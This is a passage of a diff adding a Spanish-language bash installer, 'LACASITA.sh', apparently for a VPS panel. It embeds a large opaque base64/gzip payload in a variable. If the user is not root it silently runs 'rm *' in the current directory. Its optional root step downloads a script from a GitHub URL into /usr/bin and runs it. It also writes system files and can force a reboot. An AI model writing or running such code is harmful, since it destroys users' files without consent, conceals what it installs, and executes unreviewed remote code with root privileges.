@@ -1,8 +1,644 @@
 #!/bin/bash
-# ===== BY LATAMSRC =====
-gatesccn='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'
+clear
+CTRL_C(){
+rm -rf LACASITA.sh
+  exit
+}
+
+if [ `whoami` != 'root' ]
+	then 
+     echo -e "\e[1;31mPARA PODER USAR EL INSTALADOR ES NECESARIO SER ROOT\nAUN NO SABES COMO INICAR COMO ROOT?\nDIJITA ESTE COMANDO EN TU TERMINAL ( sudo -i )\e[0m" 
+     rm *
+     exit 
+fi
+trap "CTRL_C" INT TERM EXIT
+time_reboot(){
+
+REBOOT_TIMEOUT="$1"
+  echo -e "	\e[1;97m\e[1;100mREINICIANDO VPS EN$1 SEGUNDOS\e[0m"
+while [ $REBOOT_TIMEOUT -gt 0 ]; do
+msg -ne "	-$REBOOT_TIMEOUT-\r"
+     sleep 2
+     : $((REBOOT_TIMEOUT--))
+  done
+  sudo reboot
+}
+v1=$(curl -sSL "https://raw.githubusercontent.com/lacasitamx/version/master/vercion")
+  echo "$v1" > /etc/versin_script
+msg () {
+
+  v22=$(cat /etc/versin_script)
+vesaoSCT="\033[1;37mVersion \033[1;32m$v22\033[1;31m]" 
+BRAN='\033[1;37m' && ROJO='\e[91m' && VERMELHO='\e[91m' && VERDE='\e[92m' && AMARELO='\e[93m'
+AZUL='\e[94m' && MAGENTA='\e[95m' && MAG='\033[1;96m' &&NEGRITO='\e[1m' && SEMCOR='\e[0m'
+ case $1 in
+  -ne)cor="${VERMELHO}${NEGRITO}" && echo -ne "${cor}${2}${SEMCOR}";;
+    -nazu) cor="${ROJO}${NEGRITO}" && echo -ne "${cor}${2}${SEMCOR}";;
+    -nverd)cor="${VERDE}${NEGRITO}" && echo -ne "${cor}${2}${SEMCOR}";;
+    -nama) cor="${AMARELO}${NEGRITO}" && echo -ne "${cor}${2}${SEMCOR}";;
+  -ama)cor="${AMARELO}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
+  -verm)cor="${AMARELO}${NEGRITO}${VERMELHO}" && echo -e "${cor}${2}${SEMCOR}";;
+  -azu)cor="${MAG}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
+  -verd)cor="${VERDE}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
+  -bra)cor="${BRAN}" && echo -ne "${cor}${2}${SEMCOR}";;
+  -tit)echo -e "\e[91m≪━━─━━─━─━─━─━─━━─━━─━─━─◈─━━─━─━─━─━━─━─━━─━─━━─━≫ \e[0m\n  \e[2;97m\e[3;93m❯❯❯❯❯❯ ꜱᴄʀɪᴩᴛ ᴍᴏᴅ ʟᴀᴄᴀꜱɪᴛᴀᴍx ❮❮❮❮❮❮\033[0m \033[1;31m[\033[1;32m$vesaoSCT\n\e[91m≪━━─━─━━━─━─━─━─━─━━─━─━─◈─━─━─━─━─━━━─━─━─━━━─━─━≫   \e[0m" && echo -e "${SEMCOR}${cor}${SEMCOR}";;
+  "-bar2"|"-bar")cor="${VERMELHO}————————————————————————————————————————————————————" && echo -e "${SEMCOR}${cor}${SEMCOR}";;
+ esac
+}
+
+fun_ip () {
+  MIP2=$(wget -qO- ipv4.icanhazip.com)
+MIP=$(wget -qO- whatismyip.akamai.com)
+if [ $? -eq 0 ]; then
+   IP="$MIP"
+else
+   IP="$MIP2"
+fi
+echo "$IP" >/bin/IPca
+}  
+
+os_system(){
+v3=$(curl -sSL "https://raw.githubusercontent.com/lacasitamx/version/master/anio")
+  echo "$v3" > /etc/anio
+#code by rufu99
+  system=$(cat -n /etc/issue |grep 1 |cut -d ' ' -f6,7,8 |sed 's/1//' |sed 's/      //')
+  distro=$(echo "$system"|awk '{print $1}')
+
+  case $distro in
+    Debian)vercion=$(echo $system|awk '{print $3}'|cut -d '.' -f1);;
+    Ubuntu)vercion=$(echo $system|awk '{print $2}'|cut -d '.' -f1,2);;
+  esac
+
+  link="https://raw.githubusercontent.com/rudi9999/ADMRufu/main/Repositorios/${vercion}.list"
+
+  case $vercion in
+    8|9|10|11|16.04|18.04|20.04|20.10|21.04|21.10|22.04);; #wget -O /etc/apt/sources.list ${link} &>/dev/null;;
+	12*|24.04*);; #fixDeb12Ubu24;;
+  esac
+}
+repo_install(){
+  link="https://raw.githubusercontent.com/rudi9999/ADMRufu/main/Repositorios/$VERSION_ID.list"
+  case $VERSION_ID in
+    8*|9*|10*|11*|16.04*|18.04*|20.04*|20.10*|21.04*|21.10*|22.04*);; #[[ ! -e /etc/apt/sources.list.back ]] && cp /etc/apt/sources.list /etc/apt/sources.list.back
+                                                                #    wget -O /etc/apt/sources.list ${link} &>/dev/null;;
+	12*|24.04*);; # fixDeb12Ubu24;;
+  esac
+}
+stop_install(){
+ 	msg -verm "	INSTALACION CANCELADA"
+ 	exit
+ }
+
+function printTitle
+{
+    echo ""
+    echo -e "\033[1;92m$1\033[1;91m"
+    printf '%0.s-' $(seq 1 ${#1})
+    echo ""
+}
+del(){
+  for (( i = 0; i < $1; i++ )); do
+    tput cuu1 && tput dl1
+  done
+}
+
+rootvps(){
+msg -tit
+echo -e "\033[31m     OPTENIENDO ACCESO ROOT    "
+wget https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SR/root.sh &>/dev/null -O /usr/bin/rootlx &>/dev/null
+chmod 775 /usr/bin/rootlx &>/dev/null
+rootlx
+clear
+echo -e "\033[31m     ACCESO ROOT CON ÉXITO    "
+sleep 1
+rm -rf /usr/bin/rootlx
+}
+	msg -bar
+	echo -e "\033[1;93m  YA TIENES ACCESO ROOT A TU VPS?\n  ESTO SOLO FUNCIONA PARA (AWS,GOOGLECLOUD,AZURE,ETC)\n  SI YA TIENES ACCESO A ROOT SOLO IGNORA ESTE MENSAJE\n  Y SIGUE CON LA INSTALACION NORMAL..."
+   msg -bar
+   read -p "Responde [ s | n ]: " -e -i n rootvps
+   [[ "$rootvps" = "s" || "$rootvps" = "S" ]] && rootvps
+   
+	msg -bar
+	echo "\e[1;92m╭╮\e[93m╱╱╱\e[93m╭━━━╮\e[94m╭━━━╮\e[95m╭━━━╮\e[96m╭━━━╮\e[97m╭━━╮\e[93m╭━━━━╮\e[92m╭━━━╮\e[91m╭━╮╭━╮\e[93m╭━╮╭━╮\e[0m
+\e[92m┃┃\e[93m╱╱╱\e[93m┃╭━╮┃\e[94m┃╭━╮┃\e[95m┃╭━╮┃\e[96m┃╭━╮┃\e[97m╰┫┣╯\e[93m┃╭╮╭╮┃\e[92m┃╭━╮┃\e[91m┃┃╰╯┃┃\e[93m╰╮╰╯╭╯\e[95m
+┃┃\e[93m╱╱╱\e[94m┃┃\e[91m╱\e[96m┃┃┃┃\e[91m╱\e[97m╰╯┃┃\e[91m╱\e[93m┃┃┃╰━━╮\e[91m╱\e[94m┃┃\e[91m╱\e[93m╰╯┃\e[94 ┃╰╯┃┃\e[91m╱\e[97m┃┃\e[93m┃╭╮╭╮┃\e[91m╱\e[94m╰╮╭╯\e[91m╱\e[0m
+\e[92m┃\e[93m┃\e[91m╱\e[93m╭╮┃\e[94m╰━╯┃\e[95m┃┃\e[91m╱\e[97m╭╮┃╰━╯┃\e[93m╰━━╮┃\e[91m╱\e[93m┃\e[91m┃\e[93m╱╱╱\e[96m┃┃\e[93m╱╱\e[913m┃╰━╯┃┃┃┃┃┃┃\e[91m╱\e[93m╭╯╰╮\e[91m╱\e[0m
+\e[93m┃╰━╯┃\e[94m┃╭━╮┃\e[91m┃╰━╯┃\e[97m┃╭━╮┃\e[95m┃╰━╯┃\e[97m╭┫┣╮\e[93m╱╱\e[94m┃┃\e[93m╱╱\e[94m┃╭━╮┃\e[97m┃┃\e[94m┃┃\e[93m┃┃\e[97m╭╯╭╮╰╮\e[0m
+\e[94m╰━━━╯\e[93m╰╯\e[91m╱╰╯\e[93m╰━━━╯\e[97m╰╯\e[91m╱\e[95m╰╯╰━━━╯\e[94m╰━━╯\e[93m╱╱\e[94m╰╯\e[93m╱╱\e[94m╰╯\e[91m╱\e[91m╰╯\e[93m╰╯\e[94m╰╯\e[95m╰╯\e[97m╰━╯\e[93m╰━╯\e[0m
+\e[1;93m╱╱╱╱╱╱╱╱╱╱╱╱╱\e[91m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱\e[94m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱\e[95m╱╱╱╱\e[0m
+\e[1;93m╱╱╱╱╱╱╱╱╱╱╱╱╱\e[91m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱\e[94m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱\e[95m╱╱╱╱\e[0m" >/bin/last12
+	clear
+	
+dependencias(){
+msg -tit
+msg -ama "               PREPARANDO INSTALACION"
+msg -bar2
+
+clear
+
+printTitle "Limpieza de caché local"
+apt-get clean
+clear
+printTitle "Actualizando paquetes"
+dpkg --configure -a &>/dev/null
+#apt -f install -y >/dev/null 2>&1
+apt install sudo -y &>/dev/null
+clear
+os_system
+
+msg -tit
+echo "$distro $vercion" >/tmp/distro
+echo -e "\e[1;31m	🖥SISTEMA: \e[33m$distro $vercion   " 
+echo -e "\e[1;31m	🖥IP: \e[33m$IP   "
+#clear; clear
+
+echo -e "  \033[41m   -- INSTALACION DE PAQUETES |$(cat /etc/anio) --    \e[49m"
+
+msg -bar
+	soft="sudo bsdmainutils zip unzip ufw curl python python3 python3-pip openssl screen cron iptables lsof nano at mlocate gawk figlet grep bc jq curl socat netcat net-tools cowsay lolcat figlet toilet pv perl apache2"
+
+	for install in $soft; do
+		leng="${#install}"
+		puntos=$(( 21 - $leng))
+		pts="."
+		for (( a = 0; a < $puntos; a++ )); do
+			pts+="."
+		done
+		msg -nazu "   INSTALANDO $install $(msg -ama "$pts")"
+		if [[ $(dpkg --get-selections|grep -w "${install}"|head -1) ]] || sudo apt-get install ${install} -y &>/dev/null; then
+			msg -verd " INSTALADO"
+		else
+			msg -verm2 " FALLA"
+			sleep 2
+			del 1
+			if [[ $install = "python" ]]; then
+				pts=$(echo ${pts:1})
+				msg -nazu "   INSTALANDO python2 $(msg -ama "$pts")"
+				if apt-get install python2 -y &>/dev/null ; then
+			# INSTALA PYTHON AO PYTHON2
+    apt-get install python -y >/dev/null 2>&1
+    apt-get install python2 -y >/dev/null 2>&1
+    # INSTALA PYTHON3.6 AO PYTHON3.9
+    apt-get install python3.6 -y >/dev/null 2>&1
+    apt-get install python3.7 -y >/dev/null 2>&1
+    apt-get install python3.8 -y >/dev/null 2>&1
+    apt-get install python3.9 -y >/dev/null 2>&1
+    # CRIA ALTERNATIVAS PYTHON
+    update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.6 1 >/dev/null 2>&1
+    update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.8 3 >/dev/null 2>&1
+    update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.7 2 >/dev/null 2>&1
+    update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.9 4 >/dev/null 2>&1
+    # INSTALA PIP
+    apt install pip -y &>/dev/null
+    apt install python3-pip -y &>/dev/null
+    # INSTALA SOCAT
+    apt install socat -y &>/dev/null
+    #SETAR PYTHON3
+    update-alternatives --set python3 /usr/bin/python3.6
+					
+					msg -verd " INSTALADO"
+				else
+					msg -verm2 " FALLA"
+				fi
+				continue
+			fi
+			msg -ama " aplicando fix a $install"
